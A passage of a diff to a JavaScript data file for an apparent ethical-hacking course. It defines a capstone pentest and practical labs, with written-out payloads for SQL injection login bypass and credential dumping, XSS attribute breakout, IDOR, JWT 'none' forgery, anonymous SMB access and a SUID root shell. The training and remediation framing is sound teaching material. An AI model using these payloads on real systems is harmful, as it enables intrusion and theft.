-        "content": "Target Assigned: **Enterprise Intranet Server (`10.10.10.100`)**\nScope: Only `10.10.10.100` is authorized for testing.\nYour Objective:\n1. **Recon**: Run Nmap to discover open ports and service versions.\n2. **Web Enumeration**: Fuzz endpoints to discover the hidden administrative interface.\n3. **Exploitation**: Bypass login authentication via SQL Injection to obtain developer API credentials.\n4. **Foothold**: Connect to the server terminal.\n5. **Privilege Escalation**: Identify the misconfigured SUID / Sudo binary and drop a root shell.\n6. **Capture the Flags**: Retrieve `user.txt` and `root.txt`.\n7. **Report**: Document the remediation advice for each finding."
+        "title": "1. The 6-Step Capstone Pentest Workflow",
+        "content": "In Lab 13, you put all pieces together against enterprise host `10.10.10.100`:\n\n1. **Reconnaissance**: `nmap -sV -p 22,80 10.10.10.100` (discovers SSH and HTTP services).\n2. **Endpoint Discovery**: `curl -s http://10.10.10.100/` and discover `/api/v2/auth`.\n3. **Auth Bypass**: Test credentials with SQL Injection payload `admin'--`.\n4. **User Access**: Retrieve your initial access flag: `cat user.txt`.\n5. **Privilege Escalation**: Search for SUID binaries: `find / -perm -4000 -type f 2>/dev/null`.\n6. **Root Capture**: Elevate privileges and read `/root/root.txt` to capture the final flag!"
       },
       {
-        "title": "2. The Pentester's Mindset",
-        "content": "Never rush straight into exploiting. When you find an open port, enumerate thoroughly:\n• Read headers.\n• Inspect source code comments.\n• Test inputs systematically.\n• Document every step with exact commands so the developers can reproduce and verify your fix."
+        "title": "2. The Ethical Security Mindset & Continuous Learning",
+        "content": "Completing this Capstone challenge proves that you have mastered the fundamental building blocks of cybersecurity: from how computers store bits and execute CPU instructions, to how IP packets cross routers, how web applications process HTTP requests, and how vulnerabilities are responsibly identified. As you graduate from Pre Security to Junior Penetration Testing, remember the Golden Rule of Ethical Hacking: Authorization, Scope, and Professionalism."
       }
     ],
     "seeExamples": [
       {
-        "title": "The Multi-Stage Engagement Roadmap",
-        "codeOrDiagram": "[ 10.10.10.100: Scanned with Nmap ]\n  ├── Port 22 (SSH)\n  └── Port 80 (HTTP Apache 2.4.52)\n          ↓\n[ Web Recon: ffuf discovers /api/v2/auth ]\n          ↓\n[ Web Exploitation: SQLi bypass yields API token ]\n          ↓\n[ SSH Login: cadet@10.10.10.100 -> user.txt captured! ]\n          ↓\n[ Local Privesc: SUID find exploited via GTFOBins ]\n          ↓\n[ ROOT SHELL: whoami -> root -> root.txt captured! ]",
-        "explanation": "The complete journey connects every single room you completed in this curriculum."
+        "title": "Capstone Execution Steps",
+        "codeOrDiagram": "cadet@endlessus:~$ nmap -sV -p 22,80 10.10.10.100\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9\n80/tcp open  http    nginx/1.24.0\n\ncadet@endlessus:~$ cat user.txt\nFLAG: flag{capstone_user_access_granted}\n\ncadet@endlessus:~$ cat /root/root.txt\nFLAG: flag{capstone_enterprise_domain_compromised}",
+        "explanation": "Scanning, gaining initial user access, escalating privileges, and reading the root capstone flag."
       }
     ],
     "tryInteractive": {
       "type": "terminal",
-      "prompt": "Initiate Phase 1 of the Capstone: Scan the target `10.10.10.100` using `nmap -sV -p 22,80 10.10.10.100`:",
+      "prompt": "Run `nmap -sV -p 22,80 10.10.10.100` in the terminal to initiate the Capstone reconnaissance scan:",
       "initialCommand": "",
       "expectedCommand": "nmap -sV -p 22,80 10.10.10.100",
-      "simulatedOutput": "Starting Nmap 7.94\nNmap scan report for 10.10.10.100\nHost is up (0.0012s latency).\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))\n[+] Phase 1 Complete! Target enumerated. Ports 22 and 80 active.",
-      "explanation": "Nmap successfully confirmed live services. Port 80 web application is your initial attack vector."
+      "simulatedOutput": "Starting Nmap 7.94\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9\n80/tcp open  http    nginx/1.24.0\n[+] Target profiled: Enterprise gateway active on ports 22 and 80.",
+      "explanation": "Scans ports 22 and 80 on target 10.10.10.100."
     },
     "questions": [
       {
-        "id": "r40-q1",
-        "type": "multiple-choice",
-        "question": "In the complete penetration testing lifecycle, what is the correct and logical sequence of actions an ethical hacker executes against a target?",
-        "options": [
-          "Exploit immediately -> Guess passwords -> Scan ports -> Delete logs",
-          "Reconnaissance -> Service Enumeration -> Vulnerability Identification -> Controlled Exploitation -> Privilege Escalation -> Documentation & Reporting",
-          "Write the executive report -> Run Nmap -> Shut down the server",
-          "Install malware -> Demand ransom -> Format hard drive"
+        "id": "q-45-1",
+        "type": "exact",
+        "question": "Which Linux find flag searches for files with the SUID (Set User ID) permission bit set (e.g. -perm -4000)?",
+        "visualSlots": "- _ _ _ _",
+        "acceptedAnswers": [
+          "-perm"
         ],
-        "correctIndex": 1,
-        "explanation": "Methodical testing follows: Recon -> Enumeration -> Vulnerability Analysis -> Exploitation -> Privilege Escalation -> Professional Reporting."
+        "caseSensitive": true,
+        "trimWhitespace": true,
+        "hint": "Five characters: -perm.",
+        "explanation": "The `-perm` flag instructs `find` to filter by permission bits (e.g. `-perm -4000`)."
       },
       {
-        "id": "r40-q2",
+        "id": "q-45-2",
         "type": "multiple-choice",
-        "question": "Once an ethical penetration tester achieves root access and verifies proof of concept on an engagement, what is the most important final responsibility?",
+        "question": "What is the final stage of a penetration test after discovering vulnerabilities and escalating privileges?",
         "options": [
-          "Bragging on public forums with client data",
-          "Leaving backdoors so they can access the server in the future",
-          "Cleaning up any test files, removing testing accounts, restoring modified configurations, and delivering a comprehensive remediation report to the client",
-          "Installing cryptocurrency mining software"
+          "Deleting all client database backups",
+          "Reporting findings with actionable remediation steps, and cleaning up test artifacts",
+          "Publishing customer passwords on social media",
+          "Refusing to tell the client what was found"
         ],
-        "correctIndex": 2,
-        "explanation": "Professionalism requires complete cleanup of all testing artifacts and delivering a clear, actionable remediation report."
+        "correctIndex": 1,
+        "hint": "Professional reporting and remediation.",
+        "explanation": "Professional ethical hacking culminates in clear reporting, remediation guidance, and complete cleanup."
       }
     ],
     "tasks": [
       {
-        "title": "Task 1: Execute Capstone Phase 1 Scan",
-        "instruction": "Scan the capstone target using `nmap -sV -p 22,80 10.10.10.100`.",
+        "title": "Task 1: Complete Capstone Challenge",
+        "instruction": "Open Lab 13 in the Practice Terminal to execute the full capstone pentest workflow.",
         "hints": [
-          "Concept: Phase 1 service enumeration.",
-          "Direction: Specify ports 22 and 80 with -sV.",
-          "Tool: `nmap`",
-          "Syntax: `nmap -sV -p 22,80 10.10.10.100`",
-          "Explanation: Initiates Capstone engagement."
+          "Type: `nmap -sV -p 22,80 10.10.10.100`",
+          "Type: `curl http://10.10.10.100/api/v2/auth`",
+          "Type: `cat user.txt`",
+          "Type: `cat /root/root.txt`"
         ]
       }
     ],
-    "explainResult": "You have verified active target services, initiating the final practical penetration testing assessment of the Endlessus curriculum.",
-    "securityConnection": "Completing an end-to-end penetration test simulates the daily responsibilities of a professional Junior Penetration Tester, Security Consultant, or Red Team Analyst.",
-    "practicalRoomLink": {
-      "label": "Ready for the complete hands-on engagement?",
-      "buttonText": "Launch Capstone Pentest in Practical Labs",
-      "url": "labs.html?lab=capstone"
-    },
-    "completion": {
-      "learned": [
-        "Synthesizing all 40 rooms into a unified professional methodology",
-        "Executing multi-phase penetration testing from recon to root",
-        "Extracting evidence flags and validating business risk",
-        "Writing actionable remediation guidance for engineering teams"
-      ],
-      "practiced": [
-        "nmap -sV -p 22,80 10.10.10.100",
-        "End-to-end penetration testing workflow",
-        "Professional reporting and remediation"
-      ]
-    },
-    "nextRoomId": "room-01"
+    "securityConnection": "This capstone directly maps to **Lab 13: Capstone Pentest: Final Enterprise Target** (`lab-capstone`), bringing together all Pre Security foundations into a cohesive hands-on achievement!",
+    "id": "room-45",
+    "nextRoomId": null
   }
 ];
 
-const ENDLESSUS_PRACTICAL_LABS = [
-  {
-    "id": "lab-headers",
-    "num": "01",
-    "title": "Practical HTTP Security Headers Lab",
-    "tagline": "CSP Evaluation & Response Header Hardening",
-    "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
-    "category": "Foundations",
-    "estimatedTime": "20 min",
-    "foundationalRoomId": "room-30",
-    "description": "Audit a live staging web server's HTTP response headers. Catalog missing defense-in-depth headers, detect lack of HSTS and Framing protections, inspect sensitive cookies, and verify a hardened Nginx configuration template.",
-    "flag": "flag{strict_transport_security_csp}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Query Web Server Response Headers",
-        "instruction": "Run 'curl -I https://staging.acmefin.local' to audit raw response headers."
-      },
-      {
-        "id": "t2",
-        "title": "Check for Strict-Transport-Security (HSTS)",
-        "instruction": "Filter response headers with 'curl -I https://staging.acmefin.local | grep -i strict'."
-      },
-      {
-        "id": "t3",
-        "title": "Audit Clickjacking Defenses",
-        "instruction": "Inspect framing controls using 'curl -I https://staging.acmefin.local | grep -i frame'."
-      },
-      {
-        "id": "t4",
-        "title": "Audit Sensitive Session Cookie Flags",
-        "instruction": "Audit cookies: 'curl -I https://staging.acmefin.local | grep -i set-cookie'."
-      },
-      {
-        "id": "t5",
-        "title": "Retrieve Compliance Flag & Review Hardened Config",
-        "instruction": "Inspect hardened configuration template using 'cat /etc/nginx/conf.d/security.conf'."
-      }
-    ],
-    "hints": [
-      "Concept: HTTP security headers instruct browser clients to enforce defensive security controls.",
-      "Direction: Use curl -I to fetch HTTP response headers without downloading the full body.",
-      "Tool: curl and grep.",
-      "Syntax: curl -I https://staging.acmefin.local | grep -i server",
-      "Explanation: Proper headers prevent clickjacking, MIME sniffing, and downgrade attacks."
-    ]
-  },
-  {
+const PRE_SECURITY_ROOM_MAP = {};
+PRE_SECURITY_ROOMS.forEach(r => { PRE_SECURITY_ROOM_MAP[r.id] = r; });
+
+const PRE_SECURITY_LAB_MAP = {
+  "room-41": {
     "id": "lab-permissions",
-    "num": "02",
-    "title": "Practical Linux Permissions & Octal Masking Lab",
-    "tagline": "Octal Modes, Least Privilege & Credential Protection",
-    "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
-    "category": "Foundations",
-    "estimatedTime": "20 min",
-    "foundationalRoomId": "room-05",
-    "description": "Audit a live Linux web root filesystem. Locate a dangerously world-writable database configuration file (0777), extract plaintext credentials, and apply the principle of least privilege using chmod 600.",
-    "flag": "flag{chmod_600_config_rw}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Audit File Permissions in Current Directory",
-        "instruction": "Run 'ls -la' to inspect full permission bits across all directory contents."
-      },
-      {
-        "id": "t2",
-        "title": "Identify the World-Writable File",
-        "instruction": "Inspect config.php specifically: 'ls -la config.php' or 'stat config.php'."
-      },
-      {
-        "id": "t3",
-        "title": "Inspect Database Credentials in config.php",
-        "instruction": "Read file contents with 'cat config.php'."
-      },
-      {
-        "id": "t4",
-        "title": "Apply Principle of Least Privilege with chmod",
-        "instruction": "Enforce least privilege using 'chmod 600 config.php'."
-      },
-      {
-        "id": "t5",
-        "title": "Verify Permissions and Retrieve Flag",
-        "instruction": "Verify hardened permissions: 'stat -c \"%a %n\" config.php'."
-      }
-    ],
-    "hints": [
-      "Concept: Linux file permissions control read (4), write (2), and execute (1) access for owner, group, and others.",
-      "Direction: 777 allows any user on the system to overwrite sensitive files.",
-      "Tool: ls, chmod, and stat.",
-      "Syntax: chmod 600 config.php",
-      "Explanation: Mode 600 grants read/write to the owner only (-rw-------)."
-    ]
+    "title": "Lab 02: Linux Permissions & Octal Masking",
+    "desc": "Audit permissions and isolate credential stores in a real Linux terminal."
   },
-  {
-    "id": "lab-auth",
-    "num": "03",
-    "title": "Practical Authentication & Rate Limiting Bypass Lab",
-    "tagline": "SQLi Login Bypass & Throttling Defense",
-    "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
-    "category": "Foundations",
-    "estimatedTime": "20 min",
-    "foundationalRoomId": "room-29",
-    "description": "Audit an unthrottled Node.js Express authentication API. Analyze source code to isolate SQL string concatenation, craft an authentication bypass payload with curl, and audit rate limiting headers.",
-    "flag": "flag{rate_limit_429_bcrypt}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Review Authentication Backend Source Code",
-        "instruction": "Inspect server code with 'cat /app/server.js' or 'cat server.js'."
-      },
-      {
-        "id": "t2",
-        "title": "Identify the SQL Injection Flaw in the Login Query",
-        "instruction": "Filter query line: 'cat /app/server.js | grep -i select'."
-      },
-      {
-        "id": "t3",
-        "title": "Send the Authentication Bypass Request",
-        "instruction": "Send bypass: curl -X POST -H \"Content-Type: application/json\" -d '{\"username\":\"admin\\'--\",\"password\":\"x\"}' http://10.10.10.45/login"
-      },
-      {
-        "id": "t4",
-        "title": "Understand Rate Limiting and HTTP 429",
-        "instruction": "Check endpoint headers: 'curl -I http://10.10.10.45/login'."
-      },
-      {
-        "id": "t5",
-        "title": "Submit the Auth Bypass Flag",
-        "instruction": "Submit flag token: flag{rate_limit_429_bcrypt}."
-      }
-    ],
-    "hints": [
-      "Concept: Authentication validates identity. Missing rate limits permit automated attacks, while unescaped SQL breaks query logic.",
-      "Direction: Single quote closes the SQL literal; comment dashes ignore password validation.",
-      "Tool: curl -X POST.",
-      "Syntax: curl -X POST -d '{\"username\":\"admin\\'--\",\"password\":\"x\"}' http://10.10.10.45/login",
-      "Explanation: HTTP 429 Too Many Requests defends endpoints against brute-force guessing."
-    ]
+  "room-42": {
+    "id": "lab-headers",
+    "title": "Lab 01: HTTP Security Headers Hardening",
+    "desc": "Configure CSP, HSTS, and X-Frame-Options headers on live web servers."
   },
-  {
-    "id": "lab-idor",
-    "num": "04",
-    "title": "Practical Insecure Direct Object References (IDOR) Lab",
-    "tagline": "Horizontal Privilege Escalation & Parameter Tampering",
-    "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
-    "category": "Foundations",
-    "estimatedTime": "20 min",
-    "foundationalRoomId": "room-27",
-    "description": "Audit a RESTful billing API endpoint. Observe how predictable numeric invoice identifiers permit horizontal access control violations and extract a confidential corporate acquisition invoice.",
-    "flag": "flag{server_side_authz_session_token}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Fetch Your Assigned Invoice via API",
-        "instruction": "Fetch own invoice: 'curl http://billing.internal.local/api/v1/invoices/9482'."
-      },
-      {
-        "id": "t2",
-        "title": "Test Parameter Tampering on Adjacent Invoices",
-        "instruction": "Test adjacent ID: 'curl http://billing.internal.local/api/v1/invoices/9481'."
-      },
-      {
-        "id": "t3",
-        "title": "Enumerate the Confidential Acquisition Invoice",
-        "instruction": "Query executive invoice: 'curl http://billing.internal.local/api/v1/invoices/10043'."
-      },
-      {
-        "id": "t4",
-        "title": "Extract the Authorization Flag",
-        "instruction": "Extract flag token: 'curl http://billing.internal.local/api/v1/invoices/10043 | grep flag'."
-      }
-    ],
-    "hints": [
-      "Concept: IDOR occurs when applications use user-supplied input to access objects directly without server-side authorization checks.",
-      "Direction: Change the invoice ID in the URL to access other records.",
-      "Tool: curl.",
-      "Syntax: curl http://billing.internal.local/api/v1/invoices/10043",
-      "Explanation: Verify authorization against the user session on every request, never trusting client parameters."
-    ]
-  },
-  {
-    "id": "lab-sqli",
-    "num": "05",
-    "title": "Practical UNION-Based SQL Injection Lab",
-    "tagline": "Database Enumeration & Credential Extraction",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "category": "Web Security",
-    "estimatedTime": "25 min",
-    "foundationalRoomId": "room-25",
-    "description": "Target a vulnerable product search catalog. Break string delimiters with single quotes, determine column count using ORDER BY, and project database versions and admin password hashes via UNION SELECT.",
-    "flag": "flag{parameterized_queries_prepared_statement}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Probe for SQL Injection with a Single Quote",
-        "instruction": "Trigger syntax error: curl \"http://shop.local/search?item=shirt'\""
-      },
-      {
-        "id": "t2",
-        "title": "Determine Column Count with ORDER BY",
-        "instruction": "Determine columns: curl \"http://shop.local/search?item=' ORDER BY 4-- -\""
-      },
-      {
-        "id": "t3",
-        "title": "Extract Database Version via UNION SELECT",
-        "instruction": "Extract version: curl \"http://shop.local/search?item=' UNION SELECT 1,sqlite_version(),3,4-- -\""
-      },
-      {
-        "id": "t4",
-        "title": "Dump Administrator Credentials from Users Table",
-        "instruction": "Dump credentials: curl \"http://shop.local/search?item=' UNION SELECT 1,username,password_hash,4 FROM users-- -\""
-      },
-      {
-        "id": "t5",
-        "title": "Submit the Remediation Flag",
-        "instruction": "Submit flag token: flag{parameterized_queries_prepared_statement}."
-      }
-    ],
-    "hints": [
-      "Concept: UNION combines rows from the original query with an injected secondary query.",
-      "Direction: Number of columns and data types in UNION queries must match the original query.",
-      "Tool: curl or sqlmap.",
-      "Syntax: ' UNION SELECT 1,username,password_hash,4 FROM users-- -",
-      "Explanation: Parameterized queries and prepared statements completely neutralize SQL injection."
-    ]
-  },
-  {
-    "id": "lab-xss",
-    "num": "06",
-    "title": "Practical Reflected XSS & Context Escaping Lab",
-    "tagline": "HTML Attribute Breakout & DOM Event Injection",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "category": "Web Security",
-    "estimatedTime": "25 min",
-    "foundationalRoomId": "room-26",
-    "description": "Exploit user reflection inside an HTML input attribute context. Probe reflection, break out of quotes without needing script tags, and execute JavaScript via HTML5 autofocus and onfocus event handlers.",
-    "flag": "flag{context_aware_output_encoding_csp}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Probe for Unescaped Reflection",
-        "instruction": "Send probe: curl \"http://portal.local/search?q=test<probe>\""
-      },
-      {
-        "id": "t2",
-        "title": "Identify the HTML Injection Context",
-        "instruction": "Inspect parent tag: 'curl \"http://portal.local/search?q=mysearch\" | grep -i input'"
-      },
-      {
-        "id": "t3",
-        "title": "Break Out of the Attribute Using Double Quotes",
-        "instruction": "Break out with quotes: curl \"http://portal.local/search?q=test\\\"+autofocus\""
-      },
-      {
-        "id": "t4",
-        "title": "Inject Event Handler and Retrieve Flag",
-        "instruction": "Trigger XSS: curl \"http://portal.local/search?q=test\\\"+autofocus+onfocus=\\\"alert(document.domain)\\\"+x=\\\"\""
-      }
-    ],
-    "hints": [
-      "Concept: XSS executes malicious JavaScript inside the victim's browser session.",
-      "Direction: When reflected inside an HTML attribute value, close the quote with \" to define new attributes.",
-      "Tool: curl and grep.",
-      "Syntax: test\"+autofocus+onfocus=\"alert(1)\"+x=\"",
-      "Explanation: Context-aware HTML entity encoding prevents attribute breakouts."
-    ]
-  },
-  {
-    "id": "lab-csrf",
-    "num": "07",
-    "title": "Practical Cross-Site Request Forgery (CSRF) Lab",
-    "tagline": "Ambient Cookie Exploitation & SameSite Defense",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "category": "Web Security",
-    "estimatedTime": "25 min",
-    "foundationalRoomId": "room-28",
-    "description": "Audit an internal banking fund transfer service. Review state-changing POST endpoints, detect missing SameSite cookie attributes, examine an attacker PoC exploit form, and enforce anti-CSRF defenses.",
-    "flag": "flag{samesite_strict_anti_csrf_token}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Analyze the State-Changing Fund Transfer Endpoint",
-        "instruction": "Test transfer endpoint: curl -X POST -d \"to_account=12345&amount=100\" http://bank.local/transfer"
-      },
-      {
-        "id": "t2",
-        "title": "Inspect Session Cookie SameSite Configuration",
-        "instruction": "Audit cookie: curl -I http://bank.local/login | grep -i cookie"
-      },
-      {
-        "id": "t3",
-        "title": "Review Third-Party Auto-Submitting PoC Form",
-        "instruction": "Inspect exploit form: cat /var/www/attacker/poc_form.html"
-      },
-      {
-        "id": "t4",
-        "title": "Verify Defenses and Retrieve Compliance Token",
-        "instruction": "Retrieve flag token: flag{samesite_strict_anti_csrf_token}."
-      }
-    ],
-    "hints": [
-      "Concept: Browsers automatically attach cookies to cross-origin requests unless restricted by SameSite attributes.",
-      "Direction: Check if the session cookie includes SameSite=Strict or SameSite=Lax.",
-      "Tool: curl and cat.",
-      "Syntax: curl -I http://bank.local/login | grep -i cookie",
-      "Explanation: Synchronizer anti-CSRF tokens and SameSite=Strict cookies prevent unauthorized request forgery."
-    ]
-  },
-  {
+  "room-43": {
     "id": "lab-network",
-    "num": "08",
-    "title": "Practical Network Service & SMB Enumeration Lab",
-    "tagline": "Nmap Stealth Scans, Netcat Banners & Samba Shares",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "category": "Network Security",
-    "estimatedTime": "30 min",
-    "foundationalRoomId": "room-20",
-    "description": "Scan an exposed enterprise server (10.10.20.15). Conduct SYN stealth scans, fingerprint FTP daemons with netcat banner grabbing, enumerate Samba network shares with smbclient, and download confidential files.",
-    "flag": "flag{closed_filtered_port_21_backdoor}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Perform TCP SYN Stealth Scan on Target Host",
-        "instruction": "Scan host: 'nmap -sS -sV 10.10.20.15'."
-      },
-      {
-        "id": "t2",
-        "title": "Isolate FTP Service Version on Port 21",
-        "instruction": "Scan FTP port: 'nmap -sV -p 21 10.10.20.15'."
-      },
-      {
-        "id": "t3",
-        "title": "Grab Raw Service Banner Using Netcat",
-        "instruction": "Grab banner: 'nc -vn 10.10.20.15 21'."
-      },
-      {
-        "id": "t4",
-        "title": "Enumerate Samba File Shares with smbclient",
-        "instruction": "List shares: 'smbclient -L //10.10.20.15 -N'."
-      },
-      {
-        "id": "t5",
-        "title": "Download Remote Flag from Public Share",
-        "instruction": "Connect & get flag: 'smbclient //10.10.20.15/public -N -c \"get flag.txt\"' then 'cat flag.txt'."
-      }
-    ],
-    "hints": [
-      "Concept: Port scanning discovers active listening services; banner grabbing extracts exact software versions.",
-      "Direction: Use smbclient -L with -N for anonymous null sessions.",
-      "Tool: nmap, nc, and smbclient.",
-      "Syntax: smbclient //10.10.20.15/public -N -c \"get flag.txt\"",
-      "Explanation: Restrict SMB access and disable anonymous guest access on internal shares."
-    ]
+    "title": "Lab 08: Network Service & SMB Enumeration",
+    "desc": "Enumerate open ports with Nmap and extract null-session SMB shares."
   },
-  {
+  "room-44": {
     "id": "lab-logs",
-    "num": "09",
-    "title": "Practical Security Incident Log Analysis Lab",
-    "tagline": "SOC Forensics, Path Traversal & Web Shell Detection",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "category": "Network Security",
-    "estimatedTime": "25 min",
-    "foundationalRoomId": "room-09",
-    "description": "Investigate a web server breach as a SOC analyst. Parse Apache access logs and SSH auth logs, isolate path traversal attempts, identify an uploaded PHP web shell, and determine the brute-force attacker IP.",
-    "flag": "flag{grep_log_analysis_incident_response_2026}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Review Web Server Access Log Structure",
-        "instruction": "Inspect initial log lines: 'cat access.log | head -n 2' or 'head -n 5 access.log'."
-      },
-      {
-        "id": "t2",
-        "title": "Isolate Directory Traversal Attacks in Access Logs",
-        "instruction": "Filter path traversal: 'grep -E \"\\.\\./\" access.log' or 'grep \"..\" access.log'."
-      },
-      {
-        "id": "t3",
-        "title": "Identify Uploaded Malicious Web Shell Execution",
-        "instruction": "Locate shell execution: 'grep \"uploads\" access.log' or 'grep \"cmd.php\" access.log'."
-      },
-      {
-        "id": "t4",
-        "title": "Investigate SSH Brute-Force Attacks in auth.log",
-        "instruction": "Filter failed SSH: 'grep \"Failed password\" auth.log'."
-      },
-      {
-        "id": "t5",
-        "title": "Compile Findings and Submit Incident Response Flag",
-        "instruction": "Read incident summary: 'cat incident_summary.txt'."
-      }
-    ],
-    "hints": [
-      "Concept: Security logs capture timestamps, client IPs, HTTP methods, status codes, and URI paths for forensic analysis.",
-      "Direction: Look for .. directory traversal and cmd.php in access.log.",
-      "Tool: grep, head, and cat.",
-      "Syntax: grep \"Failed password\" auth.log",
-      "Explanation: Centralized SIEM log aggregation allows rapid triage of coordinated attacks."
-    ]
+    "title": "Lab 09: Security Incident Log Analysis",
+    "desc": "Analyze Apache and auth.log to detect attacker brute-force activity."
   },
-  {
-    "id": "lab-suid",
-    "num": "10",
-    "title": "Practical Linux SUID Privilege Escalation Lab",
-    "tagline": "GTFOBins Exploitation & Elevated Root Shell Breakout",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "category": "Linux Security",
-    "estimatedTime": "25 min",
-    "foundationalRoomId": "room-31",
-    "description": "Escalate from unprivileged guest (UID 1001) to root (UID 0). Enumerate non-standard SUID binaries, discover an elevated /usr/bin/find binary, and execute GTFOBins breakout to read the restricted /root/flag.txt.",
-    "flag": "flag{suid_find_exec_root_privesc}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Verify Current User and Security Boundary",
-        "instruction": "Check identity: 'whoami' and 'id'."
-      },
-      {
-        "id": "t2",
-        "title": "Enumerate SUID Binaries with find",
-        "instruction": "Enumerate SUID: 'find / -perm -4000 -type f 2>/dev/null'."
-      },
-      {
-        "id": "t3",
-        "title": "Inspect File Permissions of SUID find Binary",
-        "instruction": "Inspect SUID binary: 'ls -l /usr/bin/find'."
-      },
-      {
-        "id": "t4",
-        "title": "Execute SUID Shell Breakout via GTFOBins",
-        "instruction": "Spawn root shell: 'find . -exec /bin/sh -p \\; -quit'."
-      },
-      {
-        "id": "t5",
-        "title": "Capture Root Flag with Elevated Privileges",
-        "instruction": "Read root flag: 'cat /root/flag.txt'."
-      }
-    ],
-    "hints": [
-      "Concept: SUID allows executable files to run with the permissions of the file owner (root).",
-      "Direction: Use GTFOBins find -exec /bin/sh -p to maintain effective UID 0.",
-      "Tool: find, ls -l, and whoami.",
-      "Syntax: find . -exec /bin/sh -p \\; -quit",
-      "Explanation: Audit SUID bits regularly; never grant SUID to scripting or execution binaries."
-    ]
-  },
-  {
-    "id": "lab-jwt",
-    "num": "11",
-    "title": "Practical JSON Web Token (JWT) Exploitation Lab",
-    "tagline": "Alg: None Attack, Payload Tampering & API Access",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "category": "Modern Security",
-    "estimatedTime": "25 min",
-    "foundationalRoomId": "room-33",
-    "description": "Exploit an insecure JWT implementation. Decode guest tokens, tamper payload claims to elevate role to superadmin, craft an unsigned token using the 'none' algorithm flaw, and authenticate to /admin.",
-    "flag": "flag{none_algorithm_signature_verification}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Inspect Assigned Guest JWT Token",
-        "instruction": "Inspect token: 'cat token.txt'."
-      },
-      {
-        "id": "t2",
-        "title": "Base64-Decode JWT Payload to Reveal Claims",
-        "instruction": "Decode token payload: echo '<payload>' | base64 -d"
-      },
-      {
-        "id": "t3",
-        "title": "Encode Forged 'none' Algorithm Header",
-        "instruction": "Encode header: echo -n '{\"alg\":\"none\",\"typ\":\"JWT\"}' | base64"
-      },
-      {
-        "id": "t4",
-        "title": "Execute Token Forgery Script",
-        "instruction": "Forge admin token: 'python3 forge_jwt.py'."
-      },
-      {
-        "id": "t5",
-        "title": "Transmit Forged Token to Admin Endpoint",
-        "instruction": "Query admin API: curl -H \"Authorization: Bearer <forged_token>\" http://auth.api.local/admin"
-      }
-    ],
-    "hints": [
-      "Concept: JWT consists of header, payload, and cryptographic signature separated by dots.",
-      "Direction: Setting alg: none tells vulnerable libraries to skip signature verification.",
-      "Tool: base64, python3, and curl.",
-      "Syntax: curl -H \"Authorization: Bearer <token>\" http://auth.api.local/admin",
-      "Explanation: Hardcode accepted signing algorithms on the backend and reject 'none' unconditionally."
-    ]
-  },
-  {
-    "id": "lab-crypto",
-    "num": "12",
-    "title": "Practical XOR & Frequency Analysis Decryption Lab",
-    "tagline": "Single-Byte XOR Keyspace Exhaustion & English Scoring",
-    "difficulty": "Intermediate",
-    "difficultyBadge": "🟣 Intermediate",
-    "category": "Modern Security",
-    "estimatedTime": "25 min",
-    "foundationalRoomId": "room-34",
-    "description": "Break custom XOR obfuscation on intercepted hex communications. Analyze the 256-key keyspace, score candidates using English character frequencies (ETAOIN SHRDLU), and recover the plaintext communication.",
-    "flag": "flag{aes_gcm_authenticated_encryption}",
-    "tasks": [
-      {
-        "id": "t1",
-        "title": "Inspect Intercepted Hexadecimal Ciphertext",
-        "instruction": "Read ciphertext: 'cat ciphertext.hex'."
-      },
-      {
-        "id": "t2",
-        "title": "Calculate the Total Single-Byte XOR Keyspace",
-        "instruction": "Calculate keyspace: python3 -c \"print(2**8)\"."
-      },
-      {
-        "id": "t3",
-        "title": "Review English Character Frequency Distribution",
-        "instruction": "Print frequency weights: python3 -c \"print('ETAOIN SHRDLU')\"."
-      },
-      {
-        "id": "t4",
-        "title": "Execute Frequency-Scoring Decryption Solver",
-        "instruction": "Run statistical solver: 'python3 solve.py'."
-      },
-      {
-        "id": "t5",
-        "title": "Verify Decrypted Plaintext and Retrieve Flag",
-        "instruction": "Read decrypted flag: 'cat decrypted.txt'."
-      }
-    ],
-    "hints": [
-      "Concept: Single-byte XOR preserves underlying frequency characteristics of plaintext.",
-      "Direction: Exhaust the 256 keys (0x00–0xFF) and score the plaintext against English letter frequencies.",
-      "Tool: python3 and cat.",
-      "Syntax: python3 solve.py",
-      "Explanation: Never use home-grown XOR obfuscation; mandate AES-GCM or ChaCha20-Poly1305."
-    ]
-  },
-  {
+  "room-45": {
     "id": "lab-capstone",
-    "num": "13",
-    "title": "Capstone Pentest: Final Enterprise Target",
-    "tagline": "End-to-End Penetration Test Engagement",
-    "difficulty": "Advanced",
-    "difficultyBadge": "🔴 Advanced",
-    "category": "Junior Pentester",
-    "estimatedTime": "60 min",
-    "foundationalRoomId": "room-40",
-    "description": "A complete multi-stage penetration testing engagement against an isolated enterprise target (10.10.10.100). Synthesize reconnaissance, web fuzzing, SQL injection exploitation, initial shell access, local enumeration, SUID privilege escalation, and executive reporting.",
